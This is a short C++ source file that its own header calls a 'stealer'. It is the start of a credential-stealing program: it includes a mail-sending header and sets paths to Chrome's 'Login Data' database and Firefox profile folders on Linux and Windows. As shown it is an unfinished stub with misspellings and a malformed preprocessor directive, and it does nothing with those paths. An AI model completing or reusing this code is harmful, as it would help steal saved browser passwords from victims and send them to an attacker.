//============================================================================
// Name        : stealer.cpp
// Author      : Hleb Hatouka
// Description : stealer in C++
//============================================================================
#include "mailsender.h"
#include <exception>
#include <filesystem>

namespace fs = std::filesystem;

int main()
{
    try
    {
#ifdef __linux__

        std::string chome_db_path = "~/.config/google-chrome/Default";
        std::string firefox_db_path = "~/.mozzila/firefox/<profilename>";

#else _WIN32

        std::string chome_db_path = "\\Google\\Chrome\\User Data\\Default\\Login Data";
        std::string firefox_db_path = "\\Mozzila\\Firefox\\Profiles\\";

#endif
    }
    catch(std::exception &){}

    return 0;
}
